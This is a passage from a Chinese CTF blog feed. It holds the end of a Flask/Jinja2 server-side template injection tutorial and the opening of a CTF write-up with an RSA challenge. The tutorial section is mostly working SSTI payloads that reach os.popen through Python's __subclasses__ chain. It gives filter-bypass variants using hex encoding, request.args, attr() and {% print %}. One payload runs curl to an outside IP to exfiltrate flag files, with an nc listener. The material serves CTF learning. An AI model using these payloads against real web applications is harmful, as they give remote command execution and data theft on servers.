class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>等同于：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="利用Hex编码绕过关键字"><a href="#利用Hex编码绕过关键字" class="headerlink" title="利用Hex编码绕过关键字"></a>利用Hex编码绕过关键字</h4><p>和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x65\x76\x61\x6c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\x6f\x73'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'\x6c\x73\x20\x2f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>等同于：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="利用引号绕过"><a href="#利用引号绕过" class="headerlink" title="利用引号绕过"></a>利用引号绕过</h4><p>我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 fl””ag 或 fl’’ag 的形式来绕过：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/fl"</span><span class="token string">"ag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考<a href="https://xz.aliyun.com/t/9584#toc-13">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a></p><h2 id="flask过滤练习"><a href="#flask过滤练习" class="headerlink" title="flask过滤练习"></a>flask过滤练习</h2><h3 id="flask无过滤"><a href="#flask无过滤" class="headerlink" title="flask无过滤"></a>flask无过滤</h3><p>这个是没有任何过滤，采用的是flask框架的jinja2模板，<br>先拿它做实验<br>首先获取空字符串对象的基类<code>object</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>或者code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取基类<code>object</code>的所有子类<br>根据常用注入模块我们查找是否含有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code><br><img src="https://img-blog.csdnimg.cn/07180aa1b9d24427a032f3c92c53d4e5.png" alt="789"><br>这个时候找到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>对应的编号，将所有子类复制出来按行排列，由于记事本是从1行开始排列，而我们计算子类是从0开始，显示在118行，对应编号为117</p><blockquote><p>Python中索引是从0开始的<br>请注意，由于__subclasses__()方法返回的是当前运行时所有直接子类的列表，具体的子类顺序可能会随着Python版本、实现和环境的变化而有所不同。因此，这段代码的具体输出将取决于你运行的Python环境。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/9ada2137faee4a4fb673024cf7b55701.png" alt="789"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/952bf190e6cb481f816fb6cb7bc31605.png" alt="456"></p><p>访问该子类的 <code>__init__ </code>方法的<code>__globals__</code>属性。<br>发现有os函数<br><img src="https://img-blog.csdnimg.cn/bf73577451764a219ad24f0b3f8e9877.png" alt="123"><br>在这里可以直接使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用<code>__builtins__</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/d09578caf19e40f08cd1f334b088e455.png" alt="789"><br>利用内建函数eval<br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e33fd0455ba04537806411548a066568.png" alt="1"><br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/f0a6e437eb5c4283a359731cb10d73fe.png" alt="789"></p><h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><p>这里过滤了<code>&#123;&#123;&#125;&#125;</code>，你可以使用<code>&#123;%print()%&#125;</code><br><code>code=&#123;%print(8*8)%&#125;</code><br>成功回显64，后面步骤一样</p><p><code>code=&#123;%print(().__class__.__base__.__subclasses__()[117].__init__.__globals__.popen("ls").read())%&#125; code=&#123;%print(().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()"))%&#125;</code></p><p>也可以使用 <code>&#123;% if ... %&#125;1&#123;% endif %&#125; </code>配合 <code>os.popen</code> 和 <code>curl </code>将执行结果外带（不外带的话无回显）出来</p><blockquote><p>1、服务器监听端口：</p><p>nc -lnvp 80<br>2、payload：<br><code>&#123;% if config.__class__.__init__.__globals__['os'].popen('curl http://8.130.xx.xx:80/`cat /f*`').read()=='p' %&#125;1&#123;% endif %&#125;</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/5ba05bb509a64b6981cce4dfd716247d.png" alt="789"></p><h3 id="flask无回显"><a href="#flask无回显" class="headerlink" title="flask无回显"></a>flask无回显</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span>、服务器监听端口：nc <span class="token operator">-</span>lnvp <span class="token number">80</span><span class="token number">2</span>、payload：<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'curl http://8.130.xx.xx:80/`cat /f*`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'p'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/5ba05bb509a64b6981cce4dfd716247d.png" alt="789"></p><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>这里只是过滤了<code>[]</code><br>如果没有任何过滤就直接到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>但是这里需要绕过`<span class="token punctuation">[</span><span class="token punctuation">]</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/c3ffdc809d0344c5884b6d507b07b0f0.png" alt="789"></p><h3 id="过滤了单、双引号"><a href="#过滤了单、双引号" class="headerlink" title="过滤了单、双引号"></a>过滤了单、双引号</h3><p>这里可以利用<strong>request对象绕过</strong><a href="https://3143047748.github.io/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4">详细解释</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#然后get传参a=popen&amp;b=ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/d0e661f4058c467eb2dfc0e1ff0ada18.png" alt="123"></p><h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>这个题目过滤了下划线，也就是说<code>__class__</code>等带下划线的都不能输入，还可以使用上面的方法<strong>request对象绕过</strong>，比如说要输入<code>&#123;&#123;''.__class__&#125;&#125;</code>那就可以这样</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">#然后get传入__calss__</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/9e0bfb01bbf74dc18972cc8fcc054a63.png" alt="123"><br>以此类推：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__</span>code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__&amp;c=__subclasses__</span>code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>d<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>e<span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/5ca68e768f8b4065a5aee6b36856c117.png" alt="456"></p><h3 id="过滤了-模板注入"><a href="#过滤了-模板注入" class="headerlink" title="过滤了.模板注入"></a>过滤了<code>.</code>模板注入</h3><h4 id="attr-函数"><a href="#attr-函数" class="headerlink" title="attr()函数"></a>attr()函数</h4><p>在<strong>flask框架</strong>的jinja2模板中如果<code>.</code>被过滤了那么可以使用原生jinja2的attr()函数。<br>比如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#改写为</span>code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span> <span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#那么</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#就可以改写为</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__getitem__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#注意这里不能直接[117]，别问为什么，我试了不行</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__class__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__base__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__subclasses__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__getitem__"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__init__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"__globals__"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"ls /"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#按理说这样就可以了，可是我测试了发现过不去哎</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用中括号-绕过"><a href="#利用中括号-绕过" class="headerlink" title="利用中括号[ ]绕过"></a>利用中括号[ ]绕过</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">"__class__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__base__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__subclasses__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__init__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__globals__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>`也就是`<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="知识点" scheme="http://3143047748.github.io/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>第六届强网拟态防御国际精英挑战赛初赛</title>
    <link href="http://3143047748.github.io/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
    <id>http://3143047748.github.io/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/</id>
    <published>2023-11-13T08:52:08.000Z</published>
    <updated>2023-11-13T08:55:03.959Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/629b0fc893fc43df905a434be60d8555.png" alt="1"></p><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>base64解密</p><h3 id="一眼看出"><a href="#一眼看出" class="headerlink" title="一眼看出"></a>一眼看出</h3><p><strong>费马定理</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">import</span> gmpy2flag<span class="token operator">=</span><span class="token string">b''</span>r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>c <span class="token operator">=</span> enc<span class="token punctuation">(</span>flag<span class="token 